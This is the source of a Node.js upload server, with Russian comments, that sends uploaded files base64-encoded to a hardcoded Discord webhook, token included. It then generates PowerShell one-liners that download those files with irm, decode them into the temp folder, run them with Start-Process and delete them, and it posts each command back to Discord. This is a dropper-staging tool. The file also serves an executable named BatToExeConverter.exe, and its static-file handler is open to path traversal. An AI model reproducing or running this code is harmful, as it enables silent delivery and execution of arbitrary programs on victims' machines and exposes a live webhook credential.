const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const UPLOAD_DIR = path.join(__dirname, 'temp_uploads');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1513431922271846401/i9sFG0VEkFmBvf1mE2CQ1W3W_0dRj4jpGsoRKzxes3kWliswhei-FrBbk5qNtx6WRLfe';

if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

function parseMultipart(data, boundary) {
    const parts = [];
    const boundaryBuffer = Buffer.from('--' + boundary);
    const endBoundaryBuffer = Buffer.from('--' + boundary + '--');
    let start = 0;
    
    while (true) {
        const boundaryIndex = data.indexOf(boundaryBuffer, start);
        if (boundaryIndex === -1) break;
        
        const isEndBoundary = data.indexOf(endBoundaryBuffer, start) === boundaryIndex;
        const nextBoundaryIndex = data.indexOf(boundaryBuffer, boundaryIndex + boundaryBuffer.length);
        
        if (nextBoundaryIndex === -1 && !isEndBoundary) break;
        
        const endIndex = nextBoundaryIndex !== -1 ? nextBoundaryIndex : boundaryIndex + (isEndBoundary ? endBoundaryBuffer.length : boundaryBuffer.length);
        const part = data.slice(boundaryIndex + boundaryBuffer.length, endIndex);
        
        let contentStart = 0;
        if (part.slice(0, 2).toString() === '\r\n') contentStart = 2;
        
        const headerEnd = part.indexOf('\r\n\r\n', contentStart);
        if (headerEnd !== -1) {
            const headers = part.slice(contentStart, headerEnd).toString();
            let content = part.slice(headerEnd + 4);
            if (content.slice(-2).toString() === '\r\n') content = content.slice(0, -2);
            
            const nameMatch = headers.match(/name="([^"]+)"/);
            const filenameMatch = headers.match(/filename="([^"]+)"/);
            
            if (nameMatch) {
                parts.push({ name: nameMatch[1], filename: filenameMatch ? filenameMatch[1] : null, content });
            }
        }
        
        if (isEndBoundary || nextBoundaryIndex === -1) break;
        start = nextBoundaryIndex;
    }
    return parts;
}

function sendDiscordMessage(content) {
    return new Promise((resolve, reject) => {
        const webhookUrl = new URL(DISCORD_WEBHOOK);
        const data = JSON.stringify({ content });
        
        const discordReq = https.request({
            hostname: webhookUrl.hostname,
            path: webhookUrl.pathname,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
        }, discordRes => {
            let responseData = '';
            discordRes.on('data', chunk => responseData += chunk);
            discordRes.on('end', () => resolve(responseData));
        });
        
        discordReq.on('error', err => reject(err));
        discordReq.write(data);
        discordReq.end();
    });
}

function uploadFileToDiscord(filePart) {
    return new Promise((resolve, reject) => {
        const base64Content = filePart.content.toString('base64');
        const encodedFilename = filePart.filename.replace(/\.[^/.]+$/, '') + '.b64';
        const boundary = '----DiscordBoundary' + Date.now();
        
        const discordData = [
            `--${boundary}\r\n`,
            `Content-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\n`,
            `Content-Type: text/plain\r\n\r\n`,
        ];
        
        const body = Buffer.concat([
            Buffer.from(discordData.join('')),
            Buffer.from(base64Content),
            Buffer.from(`\r\n--${boundary}--\r\n`)
        ]);
        
        const webhookUrl = new URL(DISCORD_WEBHOOK);
        const discordReq = https.request({
            hostname: webhookUrl.hostname,
            path: webhookUrl.pathname,
            method: 'POST',
            headers: {
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                'Content-Length': body.length
            }
        }, discordRes => {
            let data = '';
            discordRes.on('data', chunk => data += chunk);
            discordRes.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    if (json.attachments?.[0]?.url) {
                        resolve({
                            fileUrl: json.attachments[0].url,
                            originalName: filePart.filename
                        });
                    } else {
                        reject(new Error('No attachment'));
                    }
                } catch (e) {
                    reject(e);
                }
            });
        });
        
        discordReq.on('error', reject);
        discordReq.write(body);
        discordReq.end();
    });
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    if (req.method === 'POST' && req.url === '/upload') {
        const contentType = req.headers['content-type'] || '';
        
        if (contentType.includes('multipart/form-data')) {
            let boundary = contentType.split('boundary=')[1];
            if (boundary) {
                boundary = boundary.split(';')[0].replace(/^["']|["']$/g, '').trim();
            }
            
            const chunks = [];
            req.on('data', chunk => chunks.push(chunk));
            req.on('end', async () => {
                try {
                    const buffer = Buffer.concat(chunks);
                    const parts = parseMultipart(buffer, boundary);
                    const fileParts = parts.filter(p => p.name === 'fileToUpload' && p.filename);
                    
                    if (fileParts.length === 0) {
                        res.writeHead(400, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ success: false, error: 'No files' }));
                        return;
                    }
                    
                    // Upload all files
                    const uploadResults = [];
                    for (const filePart of fileParts) {
                        const result = await uploadFileToDiscord(filePart);
                        uploadResults.push(result);
                    }
                    
                    // Generate combined command
                    let combinedCmd = '';
                    if (uploadResults.length === 1) {
                        const r = uploadResults[0];
                        combinedCmd = `powershell -c "$t=\\"$env:TEMP\\${r.originalName}\\";$u='${r.fileUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
                    } else {
                        // Multiple files - combined command
                        let cmdParts = [];
                        let varDefs = [];
                        let startParts = [];
                        
                        uploadResults.forEach((r, i) => {
                            const idx = i + 1;
                            varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.originalName}\\"`);
                            varDefs.push(`$u${idx}='${r.fileUrl}'`);
                            cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
                            startParts.push(`Start-Process $t${idx} -Wait`);
                        });
                        
                        const removeParts = uploadResults.map((_, i) => `$t${i+1}`).join(',');
                        combinedCmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${removeParts}"`;
                    }
                    
                    const fileNames = uploadResults.map(r => r.originalName).join(', ');
                    const finalMsg = `📁 **${fileNames}**\n\nКоманда для скачивания и запуска:\n\`\`\`powershell\n${combinedCmd}\n\`\`\``;
                    
                    await sendDiscordMessage(finalMsg);
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        success: true, 
                        files: uploadResults,
                        command: combinedCmd 
                    }));
                    
                } catch (error) {
                    console.log('Error:', error.message);
                    res.writeHead(500, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: false, error: error.message }));
                }
            });
        } else {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: false, error: 'Invalid content type' }));
        }
        return;
    }
    
    if (req.method === 'GET' && req.url === '/download-converter') {
        const converterPath = 'C:\\Users\\HANTER\\Desktop\\Новая папка (6)\\output\\server.exe';
        if (fs.existsSync(converterPath)) {
            res.writeHead(200, {
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': 'attachment; filename="BatToExeConverter.exe"'
            });
            fs.createReadStream(converterPath).pipe(res);
        } else {
            res.writeHead(404);
            res.end('File not found');
        }
        return;
    }
    
    // Static files
    let filePath = path.join(__dirname, req.url === '/' ? 'index-encoded.html' : req.url);
    const ext = path.extname(filePath).toLowerCase();
    const mimeTypes = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json' };
    
    if (!fs.existsSync(filePath) && req.url === '/') {
        filePath = path.join(__dirname, 'index.html');
    }
    
    fs.readFile(filePath, (err, content) => {
        if (err) {
            res.writeHead(404);
            res.end('Not found');
            return;
        }
        res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'text/plain' });
        res.end(content);
    });
});

server.listen(PORT, () => {
    console.log(`Сервер запущен: http://localhost:${PORT}`);
    console.log(`\nПоддержка 1-2 файлов:`);
    console.log(`- 1 файл: стандартная команда`);
    console.log(`- 2 файла: объединенная команда для обоих`);
});
